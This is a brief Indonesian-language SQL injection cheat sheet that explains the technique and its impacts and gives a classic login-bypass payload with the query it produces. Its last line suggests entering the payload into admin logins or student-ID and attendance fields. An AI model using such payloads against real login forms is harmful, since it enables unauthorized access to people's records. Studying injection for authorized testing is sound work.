# 💉 SQL Injection (SQLi) Cheat Sheet

Dokumentasi pribadi tentang SQL Injection yang saya pelajari selama eksplorasi dunia Cyber Security. Tujuan utamanya untuk pengingat, edukasi, dan referensi saat melakukan pengujian keamanan secara legal dan etis.

---

## 🧠 Apa itu SQL Injection?

SQL Injection adalah teknik serangan di mana penyerang menyisipkan perintah SQL ke input aplikasi agar bisa memanipulasi database secara tidak sah.

---

## ⚠️ Dampak SQL Injection

- Bypass login (tanpa password)
- Dump seluruh isi database
- Mengambil data sensitif (email, password hash, dsb)
- Menjalankan perintah sistem (dalam beberapa kasus)
- Potensi eskalasi ke Remote Code Execution

---

## 🔍 sqli yg paling ampuh

### 1. Classic SQLi (Login Bypass)

```sql
Input: ' OR '1'='1 -- -
Query: SELECT * FROM users WHERE username = '' OR '1'='1' -- - AND password = ''

masukan query tersebut entah di halaman login admin atau di kolom identitas seperti: kolom nisn, absen, nim dll
